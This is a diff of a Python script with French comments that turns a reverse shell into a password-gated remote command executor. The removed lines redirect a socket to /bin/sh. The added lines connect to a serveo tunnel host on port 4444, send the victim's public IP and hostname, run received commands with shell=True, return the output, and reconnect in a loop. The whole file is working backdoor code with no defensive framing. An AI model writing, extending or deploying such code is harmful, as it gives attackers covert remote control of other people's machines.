@@ -2,7 +2,7 @@ import socket
 import subprocess
 import os
 import time
-import urllib.request  # Pour récupérer l'IP publique via HTTP
+import urllib.request
 
 # --- CONFIGURATION ---
 URL_SERVEO = "103fa379dfd22edd-93-23-16-243.serveousercontent.com"
@@ -10,37 +10,43 @@ PORT_SERVEO = 4444
 
 def obtenir_ip_publique():
     try:
-        # Utilisation d'un service API simple pour obtenir l'IP
         return urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
     except:
         return "IP Inconnue"
 
+def executer_commande(cmd):
+    """Exécute les commandes et retourne le résultat"""
+    try:
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
+    except Exception as e:
+        return str(e)
+
 def connecter():
     while True:
         try:
-            # 1. Récupérer les infos de la machine cible
-            ip_cible = obtenir_ip_publique()
-            nom_machine = socket.gethostname()
-            infos = f"--- Nouvelle Connexion ---\nIP Publique: {ip_cible}\nHostname: {nom_machine}\n--------------------------\n"
-
-            # 2. Création de la socket et connexion
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((URL_SERVEO, PORT_SERVEO))
 
-            # 3. Envoyer les infos au serveur dès la connexion
+            # Envoi des infos d'identification
+            infos = f"Connecté depuis : {obtenir_ip_publique()} ({socket.gethostname()})"
             s.send(infos.encode('utf-8'))
 
-            # 4. Redirection des flux pour le shell
-            os.dup2(s.fileno(), 0)
-            os.dup2(s.fileno(), 1)
-            os.dup2(s.fileno(), 2)
+            # Vérification du mot de passe
+            msg = s.recv(1024).decode()
+            if msg == "AUTH_REQUIRED":
+                s.send(b"1234") # Le mot de passe configuré
 
-            # 5. Lancement du shell
-            subprocess.call(["/bin/sh", "-i"])
+            # Boucle de réception des commandes
+            while True:
+                data = s.recv(1024).decode().strip()
+                if data.lower() == "exit": break
+                
+                # Exécution et renvoi du résultat
+                resultat = executer_commande(data)
+                s.send(resultat.encode() if resultat else b"Commande executee")
 
         except Exception:
-            # Attendre 20 secondes avant de réessayer si la connexion échoue
-            time.sleep(20)
+            time.sleep(20) # Attend avant de réessayer partout dans le monde
             continue
         finally:
             s.close()
